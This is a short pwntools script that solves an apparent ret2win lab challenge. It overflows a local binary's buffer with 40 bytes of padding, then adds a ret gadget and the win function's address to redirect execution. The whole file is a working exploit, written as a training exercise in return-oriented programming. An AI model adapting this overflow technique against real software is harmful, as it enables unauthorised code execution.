from pwn import *

pr = process("./ret2win")
ret2win = p64(0x00400756)
ret = p64(0x000000000040053e)
payload = b"A"* 40 + ret + ret2win

pr.sendline(payload)
print(pr.recvall().decode()) 
